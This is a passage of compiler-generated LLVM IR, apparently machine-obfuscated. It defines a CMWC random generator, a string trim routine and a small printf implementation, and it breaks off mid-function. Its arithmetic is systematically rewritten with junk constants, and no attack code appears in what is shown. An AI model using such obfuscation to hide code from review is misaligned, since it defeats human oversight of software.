  %11 = xor i32 4095, -1
  %12 = xor i32 933421763, -1
  %13 = or i32 %10, %11
  %14 = or i32 933421763, %12
  %15 = xor i32 %13, -1
  %16 = and i32 %15, %14
  %17 = and i32 %8, 4095
  store i32 %16, i32* @rand_cmwc.i, align 4
  %18 = load i64, i64* %2, align 8
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  %22 = load i32, i32* %21, align 4
  %23 = zext i32 %22 to i64
  %24 = mul i64 %18, %23
  %25 = load i32, i32* @c, align 4
  %26 = zext i32 %25 to i64
  %27 = sub i64 0, %26
  %28 = sub i64 %24, %27
  %29 = add i64 %24, %26
  store i64 %28, i64* %1, align 8
  %30 = load i64, i64* %1, align 8
  %31 = lshr i64 %30, 32
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* @c, align 4
  %33 = load i64, i64* %1, align 8
  %34 = load i32, i32* @c, align 4
  %35 = zext i32 %34 to i64
  %36 = sub i64 0, %33
  %37 = sub i64 0, %35
  %38 = add i64 %36, %37
  %39 = sub i64 0, %38
  %40 = add i64 %33, %35
  %41 = trunc i64 %39 to i32
  store i32 %41, i32* %3, align 4
  %42 = load i32, i32* %3, align 4
  %43 = load i32, i32* @c, align 4
  %44 = icmp ult i32 %42, %43
  br i1 %44, label %45, label %56

; <label>:45:                                     ; preds = %0
  %46 = load i32, i32* %3, align 4
  %47 = sub i32 %46, 773759635
  %48 = add i32 %47, 1
  %49 = add i32 %48, 773759635
  %50 = add i32 %46, 1
  store i32 %49, i32* %3, align 4
  %51 = load i32, i32* @c, align 4
  %52 = add i32 %51, 737685277
  %53 = add i32 %52, 1
  %54 = sub i32 %53, 737685277
  %55 = add i32 %51, 1
  store i32 %54, i32* @c, align 4
  br label %56

; <label>:56:                                     ; preds = %45, %0
  %57 = load i32, i32* %4, align 4
  %58 = load i32, i32* %3, align 4
  %59 = sub i32 0, %58
  %60 = add i32 %57, %59
  %61 = sub i32 %57, %58
  %62 = load i32, i32* @rand_cmwc.i, align 4
  %63 = zext i32 %62 to i64
  %64 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %63
  store i32 %60, i32* %64, align 4
  ret i32 %60
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 0, 1
  %9 = add i64 %7, %8
  %10 = sub i64 %7, 1
  %11 = trunc i64 %9 to i32
  store i32 %11, i32* %5, align 4
  br label %12

; <label>:12:                                     ; preds = %21, %1
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = call i32 @isspace(i32 %18) #10
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %12
  %22 = load i32, i32* %4, align 4
  %23 = add i32 %22, -1411837914
  %24 = add i32 %23, 1
  %25 = sub i32 %24, -1411837914
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %4, align 4
  br label %12

; <label>:27:                                     ; preds = %12
  br label %28

; <label>:28:                                     ; preds = %43, %27
  %29 = load i32, i32* %5, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp sge i32 %29, %30
  br i1 %31, label %32, label %41

; <label>:32:                                     ; preds = %28
  %33 = load i8*, i8** %2, align 8
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = sext i8 %37 to i32
  %39 = call i32 @isspace(i32 %38) #10
  %40 = icmp ne i32 %39, 0
  br label %41

; <label>:41:                                     ; preds = %32, %28
  %42 = phi i1 [ false, %28 ], [ %40, %32 ]
  br i1 %42, label %43, label %50

; <label>:43:                                     ; preds = %41
  %44 = load i32, i32* %5, align 4
  %45 = sub i32 0, %44
  %46 = sub i32 0, -1
  %47 = add i32 %45, %46
  %48 = sub i32 0, %47
  %49 = add nsw i32 %44, -1
  store i32 %48, i32* %5, align 4
  br label %28

; <label>:50:                                     ; preds = %41
  %51 = load i32, i32* %4, align 4
  store i32 %51, i32* %3, align 4
  br label %52

; <label>:52:                                     ; preds = %71, %50
  %53 = load i32, i32* %3, align 4
  %54 = load i32, i32* %5, align 4
  %55 = icmp sle i32 %53, %54
  br i1 %55, label %56, label %76

; <label>:56:                                     ; preds = %52
  %57 = load i8*, i8** %2, align 8
  %58 = load i32, i32* %3, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = load i8*, i8** %2, align 8
  %63 = load i32, i32* %3, align 4
  %64 = load i32, i32* %4, align 4
  %65 = sub i32 %63, -675299026
  %66 = sub i32 %65, %64
  %67 = add i32 %66, -675299026
  %68 = sub nsw i32 %63, %64
  %69 = sext i32 %67 to i64
  %70 = getelementptr inbounds i8, i8* %62, i64 %69
  store i8 %61, i8* %70, align 1
  br label %71

; <label>:71:                                     ; preds = %56
  %72 = load i32, i32* %3, align 4
  %73 = sub i32 0, 1
  %74 = sub i32 %72, %73
  %75 = add nsw i32 %72, 1
  store i32 %74, i32* %3, align 4
  br label %52

; <label>:76:                                     ; preds = %52
  %77 = load i8*, i8** %2, align 8
  %78 = load i32, i32* %3, align 4
  %79 = load i32, i32* %4, align 4
  %80 = add i32 %78, 318100213
  %81 = sub i32 %80, %79
  %82 = sub i32 %81, 318100213
  %83 = sub nsw i32 %78, %79
  %84 = sext i32 %82 to i64
  %85 = getelementptr inbounds i8, i8* %77, i64 %84
  store i8 0, i8* %85, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %325, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %328

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %313

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %328

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %314

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = and i32 %53, 2
  %55 = xor i32 %53, 2
  %56 = or i32 %54, %55
  %57 = or i32 %53, 2
  store i32 %56, i32* %8, align 4
  br label %45

; <label>:58:                                     ; preds = %45
  br label %59

; <label>:59:                                     ; preds = %85, %58
  %60 = load i8*, i8** %5, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp sge i32 %62, 48
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %59
  %65 = load i8*, i8** %5, align 8
  %66 = load i8, i8* %65, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp sle i32 %67, 57
  br label %69

; <label>:69:                                     ; preds = %64, %59
  %70 = phi i1 [ false, %59 ], [ %68, %64 ]
  br i1 %70, label %71, label %88

; <label>:71:                                     ; preds = %69
  %72 = load i32, i32* %7, align 4
  %73 = mul nsw i32 %72, 10
  store i32 %73, i32* %7, align 4
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = sub i32 0, 48
  %78 = add i32 %76, %77
  %79 = sub nsw i32 %76, 48
  %80 = load i32, i32* %7, align 4
  %81 = sub i32 %80, 512569969
  %82 = add i32 %81, %78
  %83 = add i32 %82, 512569969
  %84 = add nsw i32 %80, %78
  store i32 %83, i32* %7, align 4
  br label %85

; <label>:85:                                     ; preds = %71
  %86 = load i8*, i8** %5, align 8
  %87 = getelementptr inbounds i8, i8* %86, i32 1
  store i8* %87, i8** %5, align 8
  br label %59

; <label>:88:                                     ; preds = %69
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 115
  br i1 %92, label %93, label %132

; <label>:93:                                     ; preds = %88
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 0
  %96 = load i32, i32* %95, align 8
  %97 = icmp ule i32 %96, 40
  br i1 %97, label %98, label %107

; <label>:98:                                     ; preds = %93
  %99 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 3
  %100 = load i8*, i8** %99, align 8
  %101 = getelementptr i8, i8* %100, i32 %96
  %102 = bitcast i8* %101 to i32*
  %103 = add i32 %96, -813271297
  %104 = add i32 %103, 8
  %105 = sub i32 %104, -813271297
  %106 = add i32 %96, 8
  store i32 %105, i32* %95, align 8
  br label %112

; <label>:107:                                    ; preds = %93
  %108 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 2
  %109 = load i8*, i8** %108, align 8
  %110 = bitcast i8* %109 to i32*
  %111 = getelementptr i8, i8* %109, i32 8
  store i8* %111, i8** %108, align 8
  br label %112

; <label>:112:                                    ; preds = %107, %98
  %113 = phi i32* [ %102, %98 ], [ %110, %107 ]
  %114 = load i32, i32* %113, align 4
  %115 = sext i32 %114 to i64
  %116 = inttoptr i64 %115 to i8*
  store i8* %116, i8** %11, align 8
  %117 = load i8**, i8*** %4, align 8
  %118 = load i8*, i8** %11, align 8
  %119 = icmp ne i8* %118, null
  br i1 %119, label %120, label %122

; <label>:120:                                    ; preds = %112
  %121 = load i8*, i8** %11, align 8
  br label %123

; <label>:122:                                    ; preds = %112
  br label %123

; <label>:123:                                    ; preds = %122, %120
  %124 = phi i8* [ %121, %120 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.132, i32 0, i32 0), %122 ]
  %125 = load i32, i32* %7, align 4
  %126 = load i32, i32* %8, align 4
  %127 = call i32 @prints(i8** %117, i8* %124, i32 %125, i32 %126)
  %128 = load i32, i32* %9, align 4
  %129 = sub i32 0, %127
  %130 = sub i32 %128, %129
  %131 = add nsw i32 %128, %127
  store i32 %130, i32* %9, align 4
  br label %325

; <label>:132:                                    ; preds = %88
  %133 = load i8*, i8** %5, align 8
  %134 = load i8, i8* %133, align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 100
  br i1 %136, label %137, label %168

; <label>:137:                                    ; preds = %132
  %138 = load i8**, i8*** %4, align 8
  %139 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %140 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %139, i32 0, i32 0
  %141 = load i32, i32* %140, align 8
  %142 = icmp ule i32 %141, 40
  br i1 %142, label %143, label %151

; <label>:143:                                    ; preds = %137
  %144 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %139, i32 0, i32 3
  %145 = load i8*, i8** %144, align 8
  %146 = getelementptr i8, i8* %145, i32 %141
  %147 = bitcast i8* %146 to i32*
  %148 = sub i32 0, 8
  %149 = sub i32 %141, %148
  %150 = add i32 %141, 8
  store i32 %149, i32* %140, align 8
  br label %156

; <label>:151:                                    ; preds = %137
  %152 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %139, i32 0, i32 2
  %153 = load i8*, i8** %152, align 8
  %154 = bitcast i8* %153 to i32*
  %155 = getelementptr i8, i8* %153, i32 8
  store i8* %155, i8** %152, align 8
  br label %156

; <label>:156:                                    ; preds = %151, %143
  %157 = phi i32* [ %147, %143 ], [ %154, %151 ]
  %158 = load i32, i32* %157, align 4
  %159 = load i32, i32* %7, align 4
  %160 = load i32, i32* %8, align 4
  %161 = call i32 @printi(i8** %138, i32 %158, i32 10, i32 1, i32 %159, i32 %160, i32 97)
  %162 = load i32, i32* %9, align 4
  %163 = sub i32 0, %162
  %164 = sub i32 0, %161
  %165 = add i32 %163, %164
  %166 = sub i32 0, %165
  %167 = add nsw i32 %162, %161
  store i32 %166, i32* %9, align 4
  br label %325

; <label>:168:                                    ; preds = %132
  %169 = load i8*, i8** %5, align 8
  %170 = load i8, i8* %169, align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 120
  br i1 %172, label %173, label %204

; <label>:173:                                    ; preds = %168
  %174 = load i8**, i8*** %4, align 8
  %175 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %176 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %175, i32 0, i32 0
  %177 = load i32, i32* %176, align 8
  %178 = icmp ule i32 %177, 40
  br i1 %178, label %179, label %188

; <label>:179:                                    ; preds = %173
  %180 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %175, i32 0, i32 3
  %181 = load i8*, i8** %180, align 8
  %182 = getelementptr i8, i8* %181, i32 %177
  %183 = bitcast i8* %182 to i32*
  %184 = add i32 %177, 1049618890
  %185 = add i32 %184, 8
  %186 = sub i32 %185, 1049618890
  %187 = add i32 %177, 8
  store i32 %186, i32* %176, align 8
  br label %193

; <label>:188:                                    ; preds = %173
  %189 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %175, i32 0, i32 2
  %190 = load i8*, i8** %189, align 8
  %191 = bitcast i8* %190 to i32*
  %192 = getelementptr i8, i8* %190, i32 8
  store i8* %192, i8** %189, align 8
  br label %193

; <label>:193:                                    ; preds = %188, %179
  %194 = phi i32* [ %183, %179 ], [ %191, %188 ]
  %195 = load i32, i32* %194, align 4
  %196 = load i32, i32* %7, align 4
  %197 = load i32, i32* %8, align 4
  %198 = call i32 @printi(i8** %174, i32 %195, i32 16, i32 0, i32 %196, i32 %197, i32 97)
  %199 = load i32, i32* %9, align 4
  %200 = sub i32 %199, -541586203
  %201 = add i32 %200, %198
  %202 = add i32 %201, -541586203
  %203 = add nsw i32 %199, %198
  store i32 %202, i32* %9, align 4
  br label %325

; <label>:204:                                    ; preds = %168
  %205 = load i8*, i8** %5, align 8
  %206 = load i8, i8* %205, align 1
  %207 = zext i8 %206 to i32
  %208 = icmp eq i32 %207, 88
  br i1 %208, label %209, label %239

; <label>:209:                                    ; preds = %204
  %210 = load i8**, i8*** %4, align 8
  %211 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %212 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 8
  %214 = icmp ule i32 %213, 40
  br i1 %214, label %215, label %224

; <label>:215:                                    ; preds = %209
  %216 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %211, i32 0, i32 3
  %217 = load i8*, i8** %216, align 8
  %218 = getelementptr i8, i8* %217, i32 %213
  %219 = bitcast i8* %218 to i32*
  %220 = add i32 %213, -1514878907
  %221 = add i32 %220, 8
  %222 = sub i32 %221, -1514878907
  %223 = add i32 %213, 8
  store i32 %222, i32* %212, align 8
  br label %229

; <label>:224:                                    ; preds = %209
  %225 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %211, i32 0, i32 2
  %226 = load i8*, i8** %225, align 8
  %227 = bitcast i8* %226 to i32*
  %228 = getelementptr i8, i8* %226, i32 8
  store i8* %228, i8** %225, align 8
  br label %229

; <label>:229:                                    ; preds = %224, %215
  %230 = phi i32* [ %219, %215 ], [ %227, %224 ]
  %231 = load i32, i32* %230, align 4
  %232 = load i32, i32* %7, align 4
  %233 = load i32, i32* %8, align 4
  %234 = call i32 @printi(i8** %210, i32 %231, i32 16, i32 0, i32 %232, i32 %233, i32 65)
  %235 = load i32, i32* %9, align 4
  %236 = sub i32 0, %234
  %237 = sub i32 %235, %236
  %238 = add nsw i32 %235, %234
  store i32 %237, i32* %9, align 4
  br label %325

; <label>:239:                                    ; preds = %204
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 117
  br i1 %243, label %244, label %273

; <label>:244:                                    ; preds = %239
  %245 = load i8**, i8*** %4, align 8
  %246 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %247 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %246, i32 0, i32 0
  %248 = load i32, i32* %247, align 8
  %249 = icmp ule i32 %248, 40
  br i1 %249, label %250, label %258

; <label>:250:                                    ; preds = %244
  %251 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %246, i32 0, i32 3
  %252 = load i8*, i8** %251, align 8
  %253 = getelementptr i8, i8* %252, i32 %248
  %254 = bitcast i8* %253 to i32*
  %255 = sub i32 0, 8
  %256 = sub i32 %248, %255
  %257 = add i32 %248, 8
  store i32 %256, i32* %247, align 8
  br label %263

; <label>:258:                                    ; preds = %244
  %259 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %246, i32 0, i32 2
  %260 = load i8*, i8** %259, align 8
  %261 = bitcast i8* %260 to i32*
  %262 = getelementptr i8, i8* %260, i32 8
  store i8* %262, i8** %259, align 8
  br label %263

; <label>:263:                                    ; preds = %258, %250
  %264 = phi i32* [ %254, %250 ], [ %261, %258 ]
  %265 = load i32, i32* %264, align 4
  %266 = load i32, i32* %7, align 4
  %267 = load i32, i32* %8, align 4
  %268 = call i32 @printi(i8** %245, i32 %265, i32 10, i32 0, i32 %266, i32 %267, i32 97)
  %269 = load i32, i32* %9, align 4
  %270 = sub i32 0, %268
  %271 = sub i32 %269, %270
  %272 = add nsw i32 %269, %268
  store i32 %271, i32* %9, align 4
  br label %325

; <label>:273:                                    ; preds = %239
  %274 = load i8*, i8** %5, align 8
  %275 = load i8, i8* %274, align 1
  %276 = zext i8 %275 to i32
  %277 = icmp eq i32 %276, 99
  br i1 %277, label %278, label %312

; <label>:278:                                    ; preds = %273
  %279 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %280 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %279, i32 0, i32 0
  %281 = load i32, i32* %280, align 8
  %282 = icmp ule i32 %281, 40
  br i1 %282, label %283, label %291

; <label>:283:                                    ; preds = %278
  %284 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %279, i32 0, i32 3
  %285 = load i8*, i8** %284, align 8
  %286 = getelementptr i8, i8* %285, i32 %281
  %287 = bitcast i8* %286 to i32*
  %288 = sub i32 0, 8
  %289 = sub i32 %281, %288
  %290 = add i32 %281, 8
  store i32 %289, i32* %280, align 8
  br label %296

; <label>:291:                                    ; preds = %278
  %292 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %279, i32 0, i32 2
  %293 = load i8*, i8** %292, align 8
  %294 = bitcast i8* %293 to i32*
  %295 = getelementptr i8, i8* %293, i32 8
  store i8* %295, i8** %292, align 8
  br label %296

; <label>:296:                                    ; preds = %291, %283
  %297 = phi i32* [ %287, %283 ], [ %294, %291 ]
  %298 = load i32, i32* %297, align 4
  %299 = trunc i32 %298 to i8
  %300 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %299, i8* %300, align 1
  %301 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %301, align 1
  %302 = load i8**, i8*** %4, align 8
  %303 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %304 = load i32, i32* %7, align 4
  %305 = load i32, i32* %8, align 4
  %306 = call i32 @prints(i8** %302, i8* %303, i32 %304, i32 %305)
  %307 = load i32, i32* %9, align 4
  %308 = sub i32 %307, -1721104937
  %309 = add i32 %308, %306
  %310 = add i32 %309, -1721104937
  %311 = add nsw i32 %307, %306
  store i32 %310, i32* %9, align 4
  br label %325

; <label>:312:                                    ; preds = %273
  br label %324

; <label>:313:                                    ; preds = %17
  br label %314

; <label>:314:                                    ; preds = %313, %35
  %315 = load i8**, i8*** %4, align 8
  %316 = load i8*, i8** %5, align 8
  %317 = load i8, i8* %316, align 1
  %318 = zext i8 %317 to i32
  call void @printchar(i8** %315, i32 %318)
  %319 = load i32, i32* %9, align 4
  %320 = add i32 %319, 530035829
  %321 = add i32 %320, 1
  %322 = sub i32 %321, 530035829
  %323 = add nsw i32 %319, 1
  store i32 %322, i32* %9, align 4
  br label %324

; <label>:324:                                    ; preds = %314, %312
  br label %325

; <label>:325:                                    ; preds = %324, %296, %263, %229, %193, %156, %123
  %326 = load i8*, i8** %5, align 8
  %327 = getelementptr inbounds i8, i8* %326, i32 1
  store i8* %327, i8** %5, align 8
  br label %12

; <label>:328:                                    ; preds = %29, %12
  %329 = load i8**, i8*** %4, align 8
  %330 = icmp ne i8** %329, null
  br i1 %330, label %331, label %334

; <label>:331:                                    ; preds = %328
  %332 = load i8**, i8*** %4, align 8
  %333 = load i8*, i8** %332, align 8
  store i8 0, i8* %333, align 1
  br label %334

; <label>:334:                                    ; preds = %331, %328
  %335 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %336 = bitcast %struct.__va_list_tag* %335 to i8*
  call void @llvm.va_end(i8* %336)
  %337 = load i32, i32* %9, align 4
  ret i32 %337
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %51

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %27, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %30

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add i32 %22, -1131768803
  %24 = add i32 %23, 1
  %25 = sub i32 %24, -1131768803
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %11, align 4
  br label %27

; <label>:27:                                     ; preds = %21
  %28 = load i8*, i8** %12, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %12, align 8
  br label %17

; <label>:30:                                     ; preds = %17
  %31 = load i32, i32* %11, align 4
  %32 = load i32, i32* %7, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  store i32 0, i32* %7, align 4
  br label %42

; <label>:35:                                     ; preds = %30
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub i32 %37, -1306138772
  %39 = sub i32 %38, %36
  %40 = add i32 %39, -1306138772
  %41 = sub nsw i32 %37, %36
  store i32 %40, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %35, %34
  %43 = load i32, i32* %8, align 4
  %44 = xor i32 2, -1
  %45 = xor i32 %43, %44
  %46 = and i32 %45, %43
  %47 = and i32 %43, 2
  %48 = icmp ne i32 %46, 0
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %42
  store i32 48, i32* %10, align 4
  br label %50

; <label>:50:                                     ; preds = %49, %42
  br label %51

; <label>:51:                                     ; preds = %50, %4
  %52 = load i32, i32* %8, align 4
  %53 = xor i32 1, -1
  %54 = xor i32 %52, %53
  %55 = and i32 %54, %52
  %56 = and i32 %52, 1
  %57 = icmp ne i32 %55, 0
  br i1 %57, label %76, label %58

; <label>:58:                                     ; preds = %51
  br label %59

; <label>:59:                                     ; preds = %69, %58
  %60 = load i32, i32* %7, align 4
  %61 = icmp sgt i32 %60, 0
  br i1 %61, label %62, label %75

; <label>:62:                                     ; preds = %59
  %63 = load i8**, i8*** %5, align 8
  %64 = load i32, i32* %10, align 4
  call void @printchar(i8** %63, i32 %64)
  %65 = load i32, i32* %9, align 4
  %66 = sub i32 0, 1
  %67 = sub i32 %65, %66
  %68 = add nsw i32 %65, 1
  store i32 %67, i32* %9, align 4
  br label %69

; <label>:69:                                     ; preds = %62
  %70 = load i32, i32* %7, align 4
  %71 = sub i32 %70, -1090584723
  %72 = add i32 %71, -1
  %73 = add i32 %72, -1090584723
  %74 = add nsw i32 %70, -1
  store i32 %73, i32* %7, align 4
  br label %59

; <label>:75:                                     ; preds = %59
  br label %76

; <label>:76:                                     ; preds = %75, %51
  br label %77

; <label>:77:                                     ; preds = %92, %76
  %78 = load i8*, i8** %6, align 8
  %79 = load i8, i8* %78, align 1
  %80 = icmp ne i8 %79, 0
  br i1 %80, label %81, label %95

; <label>:81:                                     ; preds = %77
  %82 = load i8**, i8*** %5, align 8
  %83 = load i8*, i8** %6, align 8
  %84 = load i8, i8* %83, align 1
  %85 = zext i8 %84 to i32
  call void @printchar(i8** %82, i32 %85)
  %86 = load i32, i32* %9, align 4
  %87 = sub i32 0, %86
  %88 = sub i32 0, 1
  %89 = add i32 %87, %88
  %90 = sub i32 0, %89
  %91 = add nsw i32 %86, 1
  store i32 %90, i32* %9, align 4
  br label %92

; <label>:92:                                     ; preds = %81
  %93 = load i8*, i8** %6, align 8
  %94 = getelementptr inbounds i8, i8* %93, i32 1
  store i8* %94, i8** %6, align 8
  br label %77

; <label>:95:                                     ; preds = %77
  br label %96

; <label>:96:                                     ; preds = %107, %95
  %97 = load i32, i32* %7, align 4
  %98 = icmp sgt i32 %97, 0
  br i1 %98, label %99, label %114

; <label>:99:                                     ; preds = %96
  %100 = load i8**, i8*** %5, align 8
  %101 = load i32, i32* %10, align 4
  call void @printchar(i8** %100, i32 %101)
  %102 = load i32, i32* %9, align 4
  %103 = add i32 %102, 1871677708
  %104 = add i32 %103, 1
  %105 = sub i32 %104, 1871677708
  %106 = add nsw i32 %102, 1
  store i32 %105, i32* %9, align 4
  br label %107

; <label>:107:                                    ; preds = %99
  %108 = load i32, i32* %7, align 4
  %109 = sub i32 0, %108
  %110 = sub i32 0, -1
  %111 = add i32 %109, %110
  %112 = sub i32 0, %111
  %113 = add nsw i32 %108, -1
  store i32 %112, i32* %7, align 4
  br label %96

; <label>:114:                                    ; preds = %96
  %115 = load i32, i32* %9, align 4
